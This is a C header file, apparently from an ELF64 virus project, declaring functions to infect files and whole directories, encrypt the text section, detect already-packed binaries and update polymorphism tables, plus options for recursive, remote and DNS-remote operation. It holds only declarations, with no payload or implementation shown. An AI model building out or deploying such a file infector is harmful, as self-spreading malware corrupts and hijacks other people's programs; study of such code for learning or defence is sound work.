#ifndef INFECT_H
# define INFECT_H

# include <stddef.h>
# include <stdint.h>
# include "crypto.h"
# include "elf64.h"
# include <elf.h>
# include <stdio.h>
# include "poly.h"


extern char key[16];

//======================= WOODY ==============================

int encrypt_text_section(char *s, size_t n);

//=============================================================

int check_already_packed(char *s, size_t n, size_t virus_len, size_t dataearly_off);

typedef struct s_opt {
	char do_recur;
	char do_remote;
	char do_dns_remote;
	char print_msg;
} Opt;

typedef struct s_infect_params {
	char *b;
	size_t bn;
	size_t cmpr_off;
	size_t cmpr_len;
	size_t crypt_off;
	size_t crypt_len;
	size_t decrypt_routine_off;
	void (*encrypt_routine)(char *s, uint64_t n, uint64_t k[2]);
	size_t data_off;
	size_t dataearly_off;
	size_t infect_push_off;
	size_t infect_pop_off;
	size_t gb_table_off;
	size_t gb_table_len_off;
	size_t modif_table_off;
	size_t modif_table_len_off;
	size_t num_to_xor_off;
} InfectParams;

int			infect_dir(char *dirname, struct s_infect_params p, struct s_opt opt);
int			infect(char *fname, char *outname, struct s_infect_params p, struct s_opt opt);
void		update_tables(unsigned char *b, size_t len, struct s_infect_params p);

extern uint32_t ft_rand();

#endif
